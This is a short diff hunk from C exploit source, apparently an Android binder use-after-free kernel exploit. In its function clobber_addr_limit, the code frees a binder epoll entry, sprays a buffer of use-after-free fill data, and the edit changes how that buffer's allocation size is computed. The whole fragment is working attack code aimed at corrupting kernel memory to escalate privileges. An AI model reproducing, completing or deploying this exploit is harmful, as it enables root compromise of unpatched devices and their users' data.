@@ -221,7 +221,7 @@ void clobber_addr_limit(void)
     epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
     
-    char* f = malloc(initialSize+UAF_SPINLOCK+sizeof(testFill)+8);
+    char* f = malloc(totalLength); // initialSize+UAF_SPINLOCK+sizeof(testFill)+8);
     memcpy(f,uafFill,initialSize);
     memcpy(f+initialSize,uafFill,UAF_SPINLOCK);
     memcpy(f+initialSize+UAF_SPINLOCK,testFill,sizeof(testFill));
